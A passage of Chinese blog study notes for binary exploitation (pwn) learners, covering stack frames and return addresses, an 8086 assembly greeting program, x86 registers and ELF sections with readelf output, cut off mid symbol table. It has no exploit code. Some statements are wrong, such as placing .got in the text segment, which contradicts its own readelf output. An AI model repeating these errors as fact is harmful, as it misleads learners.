rbp保存的是子函数栈帧的起始地址，是它下面那一块栈（调用者的栈）的rsp，也就是相当于在最开始的时候给rsp做了一个备份（可以把rbp中的b记为backup）\n32位程序中会有esp、ebp，实际上就是rsp、rbp的32位低级版本，是他们的低四位，只有rsp、rbp的一半\n栈的高低区别 栈是从高地址向低地址增长的(栈的增长发生在调用子函数和push的时候)，向栈中写时是从低地址到高地址写\n而我们常说的大小端序是仅针对整数而言的（对字符串无效），假设现在有一个整数，它是0x123456789ABCDEF0，如果按最常见的小端序存储，在内存中：从低往高：F0 DE BC 9A 78 56 34 12 （注意，以一个字节为一个单元！） ；若使用不常见的大端序，则在内存中，从高往低：12 34 56 78 9A BC DE F0 （可以看作大端序正着读，符合人类直觉，而小端序反着读，符合计算机逻辑）\n✨另外提及一下在这方面很蠢的ida，例如一个整型数：0x41424344，由于是小端序，内存中存储的是 44 43 42 41，翻译成字符串就是\u0026quot;DCBA\u0026quot;，但是当你在ida中右键标注这个整型数据为字符串时，ida会显示：\u0026ldquo;ABCD\u0026rdquo;,所以在这种情况下脑子里自己给它倒过来。\nCALL函数 完整的函数调用过程要有几个语句实现的，\n在这里，main函数中call了一个用户自定义函数vuln，此时将vuln所在地址传给rip寄存器(rip寄存器是所有寄存器中最神奇的寄存器，神奇之处在于rip保存的值是什么，程序就会执行哪个地址的指令)，传了以后，程序转到vuln函数执行，这个时候rbp和rsp还未发生变化。\n接着，看到vuln函数的指令第一句：push rbp，将rbp当前的值压入栈中，在栈中保存rbp原来的值(用C语言去理解就是新建了一个变量来保存rbp原来的值)，\n紧接着下一句：mov rbp, rsp，将rsp当前的值传入rbp，用rbp保存rsp原有的值，所以说rbp是给rsp做备份用的。\n而有趣的是，当前的rbp所存储的地址，它这里的数据是什么呢，就是原rbp。\ncall除了改变rip，还将call所在的位置的下一条指令的地址压入了栈中，也就是：返回地址。 也就是说，函数调用第一个压入返回地址，第二个压入原rbp的值。当函数返回的时候，执行leave和ret两条指令，（leave等同于：mov rsp, rbp; pop rbp），两条语句把之前的rsp和rbp的值都恢复了，接着执行ret，作用是：pop rip（可能只是因为用得多，而且都用于返回，才写成ret，实际上与pop rip完全等价。），那么pop rip，就是将函数调用前保存的返回地址送进rip寄存器，下一句指令就会到那里执行，于是可以看到在函数返回的时候，栈结构被恢复成函数被调用前的样子了。\n在leave（mov rsp, rbp; pop rbp）时，这里在执行pop rbp时，rsp因为已经被赋值为rbp当前值，而之前就提到过rbp所指位置存储的数据时原rbp，所以pop rbp就会将当前rsp所指，也是rbp所指的数据弹到rbp，恢复rbp原有值，然后rsp指向了rbp原有的值，紧接着又pop了一次，那么在上次pop了栈顶上保存的原rbp后，新的栈顶数据是什么呢？没错，比原rbp早一步被压入的：返回地址\n一个关于函数调用的比喻 调用子函数的全过程由以下几条语句组成： （调用者函数 caller） call xxx （跳转到被调用函数 callee） push rbp mov rbp, rsp sub rsp, 以上四个语句就是整个标准的函数调用流程，当完成这个流程时，栈空间往低地址增长。\n如果用一个很奇怪的比喻来解释栈的增长，和栈中数据的rwx，就是你面前有一辆火车，火车内的空间代表栈空间，火车内的乘客代表数据，左边是低地址，右边是高地址，乘客在火车里面永远是先坐满最左边的那一排，再逐渐往右坐，这代表write的顺序，乘务员点人的时候也永远是从左边往右边点，这代表read的顺序\n而当发生了调用子函数的事件时，列车组人员会再拉来一列车厢，接在火车的最左边，这是栈往低地址增长。然后这个时候乘客要上车，是在那个新加上去的那节车厢从左往右坐。火车是从右往左加车厢的，栈空间增长就是在低地址那边加了节车厢，乘客永远先坐整辆火车的最左边。\npush是在最左边加一排座位并且从寄存器那里揪一排人摁进去，pop是把那排的人推进寄存器然后拆掉那排座位。\npush的时候，寄存器的值被压入栈，但是寄存器的值没有改变。pop的时候，rsp所指（栈顶）数据进入寄存器，并且rsp下移，此时表现为栈顶数据从栈中消失，但是那个地址只是不再位于栈的范围了，里面存储的数据没有改变。\n继续修改上面的奇怪比喻的话，那就是，push的时候加了排座位，并且从指定的寄存器那复制了一排人摁到了座位上;pop的时候先把原来最左边座位上的人复制一遍拖到指定的寄存器那里，再把座位拆掉，然后原本在那坐的人就站着了，但是他们“不属于火车上的人了”。\n函数返回的时候就是把那节现在不知道多长的车厢拔掉。\n然后当拔掉一节车厢时，只是车厢被拔掉了，人还站在原来的位置，站在铁轨上，如果那里又加了一节车厢，他们就到车厢里继续坐原来的位置（加车厢对应call函数，加座位是push）\n除非出现例外情况：例如拆座位拆到最左边整节车厢都拆空了，这时候如果继续拆会拆到下一节，这时要是再返回程序一般就出错了。\n在这个比喻的基础上解释栈溢出 那就是乘客在最左边的一节车厢上车，却因为车厢坐满了直接坐到了车厢之间的连通处，连通处存着的返回地址直接给坐没了（\n在这个比喻的基础上解释局部变量 乘客不是永远从“最左边”开始坐，而且基本不会从最左边（rsp）开始，真正开始坐的位置是局部变量的位置\n当函数中声明局部变量时，编译器就确定了该变量相对于rbp的偏移量，相当于在车厢某个位置画了条线，写上那个变量的名字 当有gets一类读取输入的时候，编译器会为其预留“座位” 不管怎样，变量（乘客）总是从低到高（从左到右）写入（入座）的 总结 ","date":"2022年10月26日","permalink":"https://peterliuzhi.top/principle/%E5%85%B3%E4%BA%8E%E6%A0%88%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","section":"principle","summary":"When we feel love and kindness toward others, it not only makes others feel loved and cared for, but it helps us also to develop inner happiness and peace. — Dalai Lama pwndbg中显示的栈 最上方的rsp rbp栈帧指针 栈的高低区别 CALL函数 一个关于函数","tags":["pwn","栈"],"title":"关于栈的一些基础知识"},{"categories":["tricks"],"contents":" Prejudice is a burden that confuses the past, threatens the future and renders the present inaccessible. — Maya Angelou\n一个非常简易的向用户读取输入姓名，将其显示在屏幕上，同时用hello world向其问候的程序在C语言中极其简便，但是在汇编中我们不得不去手动安排栈段与数据段，我们还得时刻注意栈的变化，防止从函数返回时无法返回到正确的位置\n源代码 assume cs:code, ds:data, ss:stack data segment StringToPrint db \u0026#34;Hello World!\u0026#34;, 13, 10, \u0026#34;$\u0026#34; StringForRead db \u0026#34;Please Input Your Name:\u0026#34;, \u0026#34;$\u0026#34; Input db 0ah, 20 dup(\u0026#34;$\u0026#34;) data ends stack segment db 128 dup (0) stack ends code segment start: mov ax, data mov ds, ax mov ax, stack mov ss, ax mov sp, 128 mov bp, sp mov ax, offset StringForRead push ax call read mov ax, offset StringToPrint push ax call puts mov ah,4ch int 21h puts: pop si pop dx push si push bp mov bp, sp mov ah, 09h int 21h mov sp, bp pop bp ret read: pop si pop ax push si push bp mov bp, sp push ax call puts mov di, offset Input + 1 mov bx, 17 get: mov cx, bx jcxz ok mov ah, 01h int 21h mov ch, 0 mov cl, al sub cl, 0dh jcxz ok mov ds:[di], al inc di dec bx jmp get ok: show: mov al, \u0026#34;,\u0026#34; mov ds:[di], al mov ax, offset INPUT push ax call puts mov sp, bp pop bp ret code ends end start 输出结果：\n分析 在数据段中我们定义了我们需要用到的各种数据，同时还有一段固定长度用于保存姓名的空间（在实际上的C程序中，局部变量是放在栈中的，通过将rsp减一定的值，在rbp和rsp之间空出一段空间来存储变量）\ndata segment StringToPrint db \u0026#34;Hello World!\u0026#34;, 13, 10, \u0026#34;$\u0026#34; StringForRead db \u0026#34;Please Input Your Name:\u0026#34;, \u0026#34;$\u0026#34; Input db 0ah, 20 dup(\u0026#34;$\u0026#34;) ;用来保存输入 data ends stack segment db 128 dup (0) ;栈的总大小为128个字节 stack ends 然后我们定义了类似C语言中的main函数：\nstart: mov ax, data mov ds, ax mov ax, stack mov ss, ax mov sp, 128 mov bp, sp ;备份sp mov ax, offset StringForRead ；将需要的数据入栈 push ax call read ;调用read函数 mov ax, offset StringToPrint push ax mov bp, sp call puts mov ah,4ch int 21h 然后我们去实现这两个函数\nPUTS:\nputs: pop si ;call的时候会将下一条指令地址进栈 pop dx ;取出参数 ;实际上64位系统的参数保存至寄存器中， ;而32位系统的参数保存在栈中， ;详情见前面的笔记 push si ;重新进栈让ret指令能够返回 push bp ;备份bp mov bp, sp ;备份sp mov ah, 09h ;09h告诉dos系统打印一个字符串 int 21h ;打印 mov sp, bp ;恢复sp的值 pop bp ;恢复bp的值 ;这两句话相当于leave指令 ret ;相当于pop rip ;返回call的下一条指令的地址 READ:\nread: pop si pop ax ;取出参数 push si push bp ;备份 mov bp, sp push ax ;要调用函数的话还要将参数进栈 ;这里如果不先出栈再进栈 ;那么参数会变成call下一条指令地址 call puts mov di, offset Input + 1 ;越过开头的换行符 mov bx, 17 ;通过bx控制最多能输入的字符数 ;（去掉前后两个换行符，终止符） get: mov cx, bx ;将bx的值传给cx jcxz ok ;如果cx=0就跳到ok ;相当于如果bx=0就跳出 mov ah, 01h ;01h代表读取单个字符 int 21h mov ch, 0 ;将cx高位设为0 mov cl, al sub cl, 0dh ;如果输入回车符cx就为0 jcxz ok ;所以输入回车就结束 mov ds:[di], al ;将字符保存在变量空间中 inc di ;相当于增加数组指针 dec bx ;减少bx，直至0 jmp get ;继续读取输入 ok: show: mov al, \u0026#34;,\u0026#34; ;在名字后加逗号 mov ds:[di], al mov ax, offset INPUT push ax ;将要puts打印的字符串地址入栈 call puts mov sp, bp ;恢复sp pop bp ;恢复bp ret ;返回 ","date":"2022年10月26日","permalink":"https://peterliuzhi.top/tricks/%E6%B1%87%E7%BC%96%E7%89%88hello-world/","section":"tricks","summary":"Prejudice is a burden that confuses the past, threatens the future and renders the present inaccessible. — Maya Angelou 一个非常简易的向用户读取输入姓名，将其显示在屏幕上，同时用hello world向其问候的程序在C语言中极其简便，","tags":["pwn"],"title":"汇编版hello world"},{"categories":["principle"],"contents":" Kindness is the language which the deaf can hear and the blind can see. — Mark Twain\n汇编与寄存器 寄存器 在16位系统中（8086CPU） 数据寄存器 变址寄存器 指针寄存器 段寄存器 指针指令寄存器 在32位系统中（i386） 在64位系统中（amd64） 汇编 系统如何执行汇编代码 将对应指针寄存器指向对应段 代码 栈 数据 PUSH指令和POP指令 寄存器 在16位系统中（8086CPU） 数据寄存器 用于暂存数据的寄存器有AX、BX、CX、DX，这些寄存器可以起到暂存16位的数据的作用。每一个又可以分成高八位和低八位，如AX寄存器，高八位为AH，低八位为AL，将超出八位的数据存入AH或AL不会自动将数据填入AX的剩下空间，而是会溢出，产生数据丢失\n寄存器AX和AL通常称为累加器(Accumulator)，用累加器进行的加减乘除耗时更少 寄存器BX称为基地址寄存器(Base Register)，可作为存储器指针来使用 寄存器CX称为计数寄存器(Count Register)。在循环和字符串操作时，要用它来控制循环次数（循环的次数保存在CX中，每循环一次CX就减一，直至0循环停止） 寄存器DX称为数据寄存器(Data Register)。在进行乘、除运算时，它可作为默认的操作数参与运算，也可用于存放I/O的端口地址 变址寄存器 SI和DI称为变址寄存器，用于存放存储单元在段内的偏移量，SI储存源地址（source index），DI储存目的地址（destination index）\n指针寄存器 BP、SP称为指针寄存器，SP是堆栈指针（stack pointer），存放栈顶地址；BP是基址指针（base pointer），存放堆栈基址偏移，相当于为最开始的SP做备份（见上节RBP和RSP的讲解）\n段寄存器 CS、DS、SS、ES被称为段寄存器，用于储存段地址，需要和偏移量一起使用才能查找到内存中的数据。\nCS为代码段（code segment），和IP寄存器一起使用，用于确定下一条指令的地址 DS为数据段（stack segment），用于存储数据所在的段地址，和诸如[0]一类的表达一起使用，如果没有特别说明，[0]==DS:[0] SS为堆栈段（stack segment），和SP寄存器一起使用，用于确定堆栈的位置，长期指向栈顶 ES为扩展段(extend segment)，为扩展的段寄存器 指针指令寄存器 IP被称作指针指令寄存器，储存相对于段寄存器CS的偏移量，在内存中找到CS:IP处的指令并执行\n在32位系统中（i386） 在AX、BX、CX、DX等前面加E，变成了EAX、EBX、ECX、EDX等，而原本的AX、BX、CX、DX等成为了其低16位，而存取它的高十六位可以通过移位操作进行（向左移16位），或者通过bswap EAX进行（交换EAX的高、低位）\n在16位CPU中，AX、BX、CX和DX不能作为基址和变址寄存器来存放存储单元的地址，但在32位CPU中，其32位寄存器EAX、EBX、ECX和EDX不仅可传送数据、暂存数据保存算术逻辑运算结果，而且也可作为指针寄存器，所以，这些32位寄存器更具有通用性\n在64位系统中（amd64） 将32位中的E前缀改为了R前缀，而原本32位中的名称用来代指64位中寄存器的低位，同时64位系统增加了8个通用寄存器，命名为R8~R15，在其后加上d，w，b指定长度（d最长，b最短）\n因此64位系统中的寄存器比32位要多8个\n✨ 32位系统中，函数的传递参数保存在栈帧中，而64位系统保存在寄存器中，分别用RDI,RSI,RDX,RCX,R8,R9作为第1-6个参数，用RAX保存返回值\n汇编 系统如何执行汇编代码 当我们执行一个exe文件时，系统会将这个exe文件载入内存，并且将（R\\E）CS:（R\\E）IP指向这块内存的最低地址，每执行一句IP就自动增加（长度不固定），而所要执行的这一段代码在汇编内称为代码段。\n同时，exe文件还会有它的栈段和数据段，这两段地址在内存中用汇编指令dw(define word)声明，dw 0就是声明一个为0的字（两个字节），dw 0,0就是声明两个字\ndata segment dw 0123h, 0456h, 0789h, 0abch, 0defh, 0fedh, 0cbah, 0987h data ends stack segment dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 stack ends 将对应指针寄存器指向对应段 我们的栈、数据、代码在哪里完全取决于对应的段寄存器和指针寄存器、指针指令寄存器指向哪里\n因此，我们需要改变对应寄存器的值\n代码 我们需要设置CS:IP，使其指向代码被载入的内存处\n在汇编中，只需要在需要执行的代码前加上start:，最后end start即可\ncode segment start: mov ax, stack mov ss, ax mov sp, 100h ;初始化栈指针 mov ax, data mov ds,ax ;初始化内存指针 code ends end start 栈 需要将SS指向栈段，并设置SP指向栈底（一开始栈为空）\nmov ax, stack mov ss, ax mov sp, 100h ;初始化栈指针 数据 将DS指向数据段，就可以用[0]式的表达式存取数据了\nmov ax, data mov ds,ax ;初始化内存指针 PUSH指令和POP指令 PUSH指令和POP指令均不会变更原来的数据，而是变更目的地的数据。\npush ds:[0]就是把数据段中ds:[0]处的数据推入栈中，相当于mov ss:sp ds:[0] pop ds:[0]就是把栈顶的数据弹入ds:[0]中，相当于mov ds:[0] ss:sp ","date":"2022年10月26日","permalink":"https://peterliuzhi.top/principle/%E6%B1%87%E7%BC%96%E4%B8%8E%E5%AF%84%E5%AD%98%E5%99%A8/","section":"principle","summary":"Kindness is the language which the deaf can hear and the blind can see. — Mark Twain 汇编与寄存器 寄存器 在16位系统中（8086CPU） 数据寄存器 变址寄存器 指针寄存器 段寄存器 指针指令寄存器 在32位系统中","tags":["pwn"],"title":"汇编与寄存器"},{"categories":["principle"],"contents":" Myths which are believed in tend to become true. — George Orwell\nELF详解 什么是ELF 使用readelf命令读取elf文件 ELF文件类型 ELF程序头（描述段的头） PT_LOAD PT_DYNAMIC（动态链接可执行文件特有） PT_NOTE PT_INTERP PT_PHDR ELF节头（section header） 段和节的区别 节头 .text节 .rodata节 .data节 .bss节 .plt节 .got与.got.plt节 为什么有了.plt还要有.got呢？ got表的结构 .ctors和.dtors节 ELF符号 .symtab节 .strtab节 .dynsym节 .dynstr节 .rel.*节 .hash节 .shstrtab节 ELF重定位 Relocation 基于二进制修补的重定位代码注入 什么是ELF ELF（Executable and Linkable Format）是一种用于二进制文件、可执行文件、目标代码、共享库和核心转储格式文件的文件格式，目前已经成为Unix和类Unix操作系统的标准二进制格式，目前常见的Linux、Android可执行文件、共享库（.so）、目标文件（ .o）以及Core 文件均为此格式\n使用readelf命令读取elf文件 readelf -S 查询节头表 -l 查询程序头表 -s 查询符号表 -e 查询ELF文件头数据 -r 查询重定位入口 -d 查询动态段 ELF文件类型 使用ELF格式的文件可以被标记为以下五种格式：\n未知类型ET_NONE 重定位文件ET_REL，通常是还没有经过链接的一段独立代码，也就是.o文件 可执行文件ET_EXEC，这个就不用说了~ 共享目标文件ET_DYN，就是动态链接库 核心文件ET_CORE，程序崩溃或产生SIGSEGV信号的时候会在此文件中记录整个进程的镜像信息，从而被GDB读取复盘 我们可以通过readelf -h命令来查看原始的ELF文件头：\n$ readelf -h babyrop ELF 头： Magic： 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 类别: ELF64 数据: 2 补码，小端序 (little endian) Version: 1 (current) OS/ABI: UNIX - System V ABI 版本: 0 类型: EXEC (可执行文件) 系统架构: Advanced Micro Devices X86-64 版本: 0x1 入口点地址： 0x4004e0 程序头起点： 64 (bytes into file) Start of section headers: 6768 (bytes into file) 标志： 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 9 Size of section headers: 64 (bytes) Number of section headers: 31 Section header string table index: 28 readelf是怎么找到ELF头在哪里呢？答案就是ELF头从二进制文件的0号地址，也就是文件的开头开始，就好像一篇论文在一开始会对整个论文做概述一样，ELF文件头是对剩余部分的一个映射\nELF文件头告诉了我们：\n这个文件是啥类型的文件 这个文件的结构 程序开始执行的入口地址 其他ELF头（节头、程序头）的地址（偏移量） ELF程序头（描述段的头） 在原始的ELF头中我们记录了ELF程序头的地址（e_phoff），这样我们就能得到程序头表\nELF程序头是对二进制文件中段的描述，是程序必需的一部分。\n我们知道，一个程序想要运行，首先要把它装载到内存上，而这个ELF程序头就相当于一本程序装载的说明书，告诉你每个段是怎样的。\n我们可以通过readelf -l来查询程序头表：\n$ readelf -l babyrop Elf 文件类型为 EXEC (可执行文件) Entry point 0x4004e0 There are 9 program headers, starting at offset 64 程序头： Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align PHDR 0x0000000000000040 0x0000000000400040 0x0000000000400040 0x00000000000001f8 0x00000000000001f8 R E 0x8 INTERP 0x0000000000000238 0x0000000000400238 0x0000000000400238 0x000000000000001c 0x000000000000001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000 0x0000000000000814 0x0000000000000814 R E 0x200000 LOAD 0x0000000000000e10 0x0000000000600e10 0x0000000000600e10 0x0000000000000240 0x0000000000000248 RW 0x200000 DYNAMIC 0x0000000000000e28 0x0000000000600e28 0x0000000000600e28 0x00000000000001d0 0x00000000000001d0 RW 0x8 NOTE 0x0000000000000254 0x0000000000400254 0x0000000000400254 0x0000000000000044 0x0000000000000044 R 0x4 GNU_EH_FRAME 0x00000000000006e8 0x00000000004006e8 0x00000000004006e8 0x0000000000000034 0x0000000000000034 R 0x4 GNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 RW 0x10 GNU_RELRO 0x0000000000000e10 0x0000000000600e10 0x0000000000600e10 0x00000000000001f0 0x00000000000001f0 R 0x1 Section to Segment mapping: 段节... 00 01 .interp 02 .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 03 .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 04 .dynamic 05 .note.ABI-tag .note.gnu.build-id 06 .eh_frame_hdr 07 08 .init_array .fini_array .jcr .dynamic .got ELF程序头有一些常见的类型，下面我们来介绍一下它们\nPT_LOAD 这类程序头描述的是可以被装载的段，根据这个头，我们将需要的段装载/映射到内存中\n一个动态链接的ELF可执行文件通常包括：\ntext段：存放程序代码（通常可读可执行PF_R|PF_X） data段：全局变量和动态链接信息（通常可读可写PF_R|PF_W） 我们可以更改程序头中p_flags处增加PF_W标记来修改text段权限，从而扭曲原本的代码\nPT_DYNAMIC（动态链接可执行文件特有） 它包括了：\n动态链接的库列表 DT_NEEDED：共享库名的字符串表的偏移量 GOT表的地址 DT_PLTGOT：全局偏移表（GOT）的地址 重定位条目的相关信息 DT_SYMTAB：动态符号表的地址，对应.dynsym节 DT_HASH：符号散列表的地址，对应.hash节 DT_STRTAB：符号字符串表的地址，对应.dynstr节 \u0026hellip; PT_NOTE 特定供应商/系统相关的附加信息\n实际上这一段只保存了操作系统的规范信息，在运行的时候是不需要它的\n还有一种note段的攻击，但作者实在是没找到相关资料，如果各位读者有相关资料可以参考，烦请在评论区给出链接，感谢您的付出！\nPT_INTERP 对程序解释器位置的描述，如，/lib/linux-ld.so.2一般指动态连接器的位置，也即程序解释器的位置（.so.2文件不是.so文件）\nPT_PHDR 保存了程序头表本身的位置和大小，phdr为program header的缩写\nELF节头（section header） 我们可以使用readelf -S命令查看节头表：\n$ readelf -S babyrop There are 31 section headers, starting at offset 0x1a70: 节头： [号] 名称 类型 地址 偏移量 大小 全体大小 旗标 链接 信息 对齐 [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .interp PROGBITS 0000000000400238 00000238 000000000000001c 0000000000000000 A 0 0 1 [ 2] .note.ABI-tag NOTE 0000000000400254 00000254 0000000000000020 0000000000000000 A 0 0 4 [ 3] .note.gnu.bu[...] NOTE 0000000000400274 00000274 0000000000000024 0000000000000000 A 0 0 4 [ 4] .gnu.hash GNU_HASH 0000000000400298 00000298 000000000000001c 0000000000000000 A 5 0 8 [ 5] .dynsym DYNSYM 00000000004002b8 000002b8 0000000000000090 0000000000000018 A 6 1 8 [ 6] .dynstr STRTAB 0000000000400348 00000348 000000000000005f 0000000000000000 A 0 0 1 [ 7] .gnu.version VERSYM 00000000004003a8 000003a8 000000000000000c 0000000000000002 A 5 0 2 [ 8] .gnu.version_r VERNEED 00000000004003b8 000003b8 0000000000000030 0000000000000000 A 6 1 8 [ 9] .rela.dyn RELA 00000000004003e8 000003e8 0000000000000018 0000000000000018 A 5 0 8 [10] .rela.plt RELA 0000000000400400 00000400 0000000000000060 0000000000000018 AI 5 24 8 [11] .init PROGBITS 0000000000400460 00000460 000000000000001a 0000000000000000 AX 0 0 4 [12] .plt PROGBITS 0000000000400480 00000480 0000000000000050 0000000000000010 AX 0 0 16 [13] .plt.got PROGBITS 00000000004004d0 000004d0 0000000000000008 0000000000000000 AX 0 0 8 [14] .text PROGBITS 00000000004004e0 000004e0 00000000000001b2 0000000000000000 AX 0 0 16 [15] .fini PROGBITS 0000000000400694 00000694 0000000000000009 0000000000000000 AX 0 0 4 [16] .rodata PROGBITS 00000000004006a0 000006a0 0000000000000047 0000000000000000 A 0 0 8 [17] .eh_frame_hdr PROGBITS 00000000004006e8 000006e8 0000000000000034 0000000000000000 A 0 0 4 [18] .eh_frame PROGBITS 0000000000400720 00000720 00000000000000f4 0000000000000000 A 0 0 8 [19] .init_array INIT_ARRAY 0000000000600e10 00000e10 0000000000000008 0000000000000000 WA 0 0 8 [20] .fini_array FINI_ARRAY 0000000000600e18 00000e18 0000000000000008 0000000000000000 WA 0 0 8 [21] .jcr PROGBITS 0000000000600e20 00000e20 0000000000000008 0000000000000000 WA 0 0 8 [22] .dynamic DYNAMIC 0000000000600e28 00000e28 00000000000001d0 0000000000000010 WA 6 0 8 [23] .got PROGBITS 0000000000600ff8 00000ff8 0000000000000008 0000000000000008 WA 0 0 8 [24] .got.plt PROGBITS 0000000000601000 00001000 0000000000000038 0000000000000008 WA 0 0 8 [25] .data PROGBITS 0000000000601038 00001038 0000000000000018 0000000000000000 WA 0 0 8 [26] .bss NOBITS 0000000000601050 00001050 0000000000000008 0000000000000000 WA 0 0 1 [27] .comment PROGBITS 0000000000000000 00001050 0000000000000035 0000000000000001 MS 0 0 1 [28] .shstrtab STRTAB 0000000000000000 00001964 000000000000010c 0000000000000000 0 0 1 [29] .symtab SYMTAB 0000000000000000 00001088 0000000000000690 0000000000000018 30 47 8 [30] .strtab STRTAB 0000000000000000 00001718 000000000000024c 0000000000000000 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), D (mbind), l (large), p (processor specific) 这里面我们可以注意一下每个节的旗标（flag），如果被标记为A，那么说明该节会在程序运行时分配并装载进内存。有一些节在运行时不是必需的，就不会被装载。比如.symtab节，有时候为了节省空间会把它删掉\n段和节的区别 段是程序执行的必要组成部分 节是段中代码或数据的划分 段是房子的房间，节是房间中的屏风隔断\n而所谓节头表就是对这些节的位置和大小的描述（主要用于链接和调试，没有它程序可以正常运行）\n节头 如果程序中缺少了节头，并不意味着节消失了；就好像电话簿上某人的号码消失了，并不代表某人的号码不存在了。我们只是不能再通过节头引用节了而已 因此，我们可以人为地删除节头，程序仍然可以正常运行 但是如果没有节头，gdb和objdump这种工具就没用了\n.text节 保存了程序代码指令，一般存在text段中\n.rodata节 rodata为read-only data的缩写，意为只读数据，这个节因为数据只读，因此不存在data段中，而是在text段中\n.data节 .data节保存了初始化的全局变量等数据，存在data段中\n.bss节 .bss节中保存了\n未初始化的全局变量和静态变量 在代码中没有明确初始化的全局变量和静态变量 它存在data段中，一般来说它会被初始化为0，但是在运行期间它的值是可能改变的\n它为什么被称为bss呢？请看下图：\nbss原本是指 block storage start 块状存储起点（渣翻请勿在意）（或者block started by symbol），但是为了和.data节区分，可以记作 better save space 更优保存空间\n可以参考这篇博文\n.plt节 plt表，意为procedure linkage table 过程链接表，包含了动态链接器调用从共享库导入的函数所必需的相关代码，保存在text段中\n.got与.got.plt节 got意为Global Offsets Table，保存了全局偏移表，保存在text段中，和.plt节一起提供了对导入的共享库函数的访问入口，由动态链接器在运行时进行修改。\n.got和.plt的关系类似于：\n.got中存储的是一块空间的地址，这块空间中一开始保存了一个offset用于与.plt中的地址进行计算得到真实地址，然后就会把这个真实地址存入.got指向的那块空间之中\nGot.plt is actually smaller subset of the .got section. Think of pointing to the tail end of an array of slots. Conceptually it sort of looks like this\nint[10] got; int* gotplt = \u0026amp;got[5]; 而.got.plt节是.got的一个子集，\nGot section basically can contain addresses of Global variables and functions. All the global variables are in the first couple of slots and suffix is all pointers to functions. gotplt is the first slot .got that contains only the addresses of function.\n.got表中包含了全局变量和函数的地址，但.got.plt中只有函数\nEventually after function addresses are resolved via means of plt. The resolved address goes into .gotplt which btw is inside .got as I mentioned earlier.\n最终由于.plt表的存在，运行的时候.got.plt中的地址会被转化，而这个.got.plt仍然在.got中\n更多请查看此问题\n为什么有了.plt还要有.got呢？ 因为单纯由plt表没法找到函数的真实地址，我们需要通过got表才能真正地调用函数。\n既然如此，为什么不一开始就保存函数的真实地址呢？\n因为动态链接器采用默认的延迟链接方式时，不会在第一次调用时就对地址进行解析，这样可以提高装载时的性能\ngot表的结构 .ctors和.dtors节 ctors -\u0026gt; Constructor 构造器，是在main函数之前需要执行的函数 dtors -\u0026gt; Destructor 析构器，是在main函数之后需要执行的函数 它们保存了构造函数和析构函数的指针\nELF符号 符号是对某些类型的数据或者代码的符号引用，实际上就是一个结构体，可以用于链接、重定位、反汇编和调试\ntypedef struct elf64_sym { Elf64_Word st_name; /* 符号名称，字符串表中的索引 STT_OBJECT 表示符号关联到一个数据对象，如变量、数组或指针； STT_FUNC 表示符号关联到一个函数； STT_SECTION 表示符号关联到节 STT_NOTYPE 表示符号类型未指定，用于未定义引用 */ unsigned char st_info; /* 类型和绑定属性： STB_LOCAL 本地符号在目标文件之外时不可见的 STB_GLOBAL 对于所有要合并的目标文件都可见 STB_WEAK 类似于STB_GLOBAL，不过优先级较弱，可能会被为标记为STB_WEAK的同名符号覆盖 */ unsigned char st_other; // 语义未定义，0 Elf64_Half st_shndx; // 相关节的索引，符号将绑定到该节，此外SHN_ABS指定符号是绝对值，不因重定位而改变，SHN_UNDEF标识未定义符号。 Elf64_Addr st_value; // 符号的值 Elf64_Xword st_size; // 符号的长度，如一个指针的长度或struct对象中包含的字节数。 }Elf64_Sym; 我们可以使用readelf -s命令查看程序符号表：\n$ readelf -s babyrop Symbol table \u0026#39;.dynsym\u0026#39; contains 6 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FUNC GLOBAL DEFAULT UND [...]@GLIBC_2.2.5 (2) 2: 0000000000000000 0 FUNC GLOBAL DEFAULT UND [...]@GLIBC_2.2.5 (2) 3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND [...]@GLIBC_2.2.5 (2) 4: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 5: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __[...]@GLIBC_2.7 (3) Symbol table \u0026#39;.symtab\u0026#39; contains 70 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000400238 0 SECTION LOCAL DEFAULT 1 .interp 2: 0000000000400254 0 SECTION LOCAL DEFAULT 2 .note.ABI-tag 3: 0000000000400274 0 SECTION LOCAL DEFAULT 3 .note.gnu.build-id 4: 0000000000400298 0 SECTION LOCAL DEFAULT 4 .gnu.hash 5: 00000000004002b8 0 SECTION LOCAL DEFAULT 5 .dynsym 6: 0000000000400348 0 SECTION LOCAL DEFAULT 6 .dynstr 7: 00000000004003a8 0 SECTION LOCAL DEFAULT 7 .gnu.version 8: 00000000004003b8 0 SECTION LOCAL DEFAULT 8 .gnu.version_r 9: 00000000004003e8 0 SECTION LOCAL DEFAULT 9 .rela.dyn 10: 0000000000400400 0 SECTION LOCAL DEFAULT 10 .rela.plt 11: 0000000000400460 0 SECTION LOCAL DEFAULT 11 .init 12: 0000000000400480 0 SECTION LOCAL DEFAULT 12 .plt 13: 00000000004004d0 0 SECTION LOCAL DEFAULT 13 .plt.got 14: 00000000004004e0 0 SECTION LOCAL DEFAULT 14 .text 15: 0000000000400694 0 SECTION LOCAL DEFAULT 15 .fini 16: 00000000004006a0 0 SECTION LOCAL DEFAULT 16 .rodata 17: 00000000004006e8 0 SECTION LOCAL DEFAULT 17 .eh_frame_hdr 18: 0000000000400720 0 SECTION LOCAL DEFAULT 18 .eh_frame 19: 0000000000600e10 0 SECTION 